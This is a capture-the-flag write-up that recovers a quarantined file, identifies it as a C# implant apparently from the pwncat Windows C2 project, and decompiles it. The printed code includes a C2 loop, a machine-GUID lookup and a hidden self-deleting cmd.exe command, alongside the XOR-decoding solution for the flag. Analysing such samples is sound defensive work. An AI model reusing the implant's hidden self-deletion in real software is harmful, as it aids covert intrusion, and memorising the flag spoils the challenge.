# X-RAY
The SOC detected malware on a host, but antivirus already quarantined it... can you still make sense of what it does?

NOTE: Archive password is infected


## Solution

This was a very fun task. I had to learn a new tool and techniques I'd never even heard about before.

I wasn't quite sure how to start, but after googling for a while, I found a tool called "DeXRAY". This is a tool to analyze files quarantined by antivirus programs. This had to be the correct tool to use, considering the title and description of the task.

I ran the tool on the file we were given:

`./DeXRAY.pl x-ray`

I got a new file, but it took a while for me to realize that it was a `DLL` file. I only realized it after looking at the HEX and finding mentions of [this GitHub repository](https://github.com/calebstewart/pwncat-windows-c2), which is malware the John Hammond has contributed to. I found the DLL files in the repository, and it clicked.

The DLL file was written in C#, meaning that I could get the original source code without an issue.

I decompiled the file using ILSpy and found this in main:

```c#

	public void main(object oPath, object oStdin)
	{
		string text = (string)oPath;
		StreamReader streamReader = (StreamReader)oStdin;
		(new object[1])[0] = streamReader;
		Protocol protocol = new Protocol(streamReader);
		PowerShell.init_pshost();
		Console.WriteLine("READY");
		Console.WriteLine((string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "NONE"));
		protocol.Loop();
		string text2 = "ping -n 5 127.0.0.1 & del \"" + text + "\"";
		System.Diagnostics.Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			Arguments = "/C " + text2
		});
		Environment.Exit(Environment.ExitCode);
	}

	public static Dictionary<string, object> exit()
	{
		throw new Protocol.LoopExit();
	}

	private static byte[] otp(byte[] data, byte[] key)
	{
		byte[] array = new byte[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			array[i] = (byte)(data[i] ^ key[i % key.Length]);
		}
		return array;
	}

	private static byte[] load(string hex)
	{
		int length = hex.Length;
		byte[] array = new byte[length / 2];
		for (int i = 0; i < length; i += 2)
		{
			array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
		}
		return array;
	}

	public static void Main(string[] args)
	{
		new StageTwo().main("", new StreamReader(Console.OpenStandardInput()));
		byte[] data = load("15b279d8c0fdbd7d4a8eea255876a0fd189f4fafd4f4124dafae47cb20a447308e3f77995d3c");
		byte[] key = load("73de18bfbb99db4f7cbed3156d40959e7aac7d96b29071759c9b70fb18947000be5d41ab6c41");
		byte[] bytes = otp(data, key);
		Encoding.UTF8.GetString(bytes);
	}
```

This code includes hidden text, the one time password (otp), and the code for decrypting it.

I made a python script to decrypt the data, which gave me the flag:

```python
# Let's decode the provided hex strings and use the OTP decryption function to reveal the hidden data.

# Provided hex strings for data and key
data_hex = "15b279d8c0fdbd7d4a8eea255876a0fd189f4fafd4f4124dafae47cb20a447308e3f77995d3c"
key_hex = "73de18bfbb99db4f7cbed3156d40959e7aac7d96b29071759c9b70fb18947000be5d41ab6c41"

# Load function to convert hex to byte array
def load(hex_string):
    length = len(hex_string)
    return bytearray(int(hex_string[i:i+2], 16) for i in range(0, length, 2))

# OTP decryption function
def otp(data, key):
    return bytearray(data[i] ^ key[i % len(key)] for i in range(len(data)))

# Convert hex strings to byte arrays
data = load(data_hex)
key = load(key_hex)

# Perform OTP decryption
decrypted_bytes = otp(data, key)

# Convert the result to a string
decrypted_string = decrypted_bytes.decode('utf-8', errors='replace')

# Display the decrypted result
decrypted_string
```
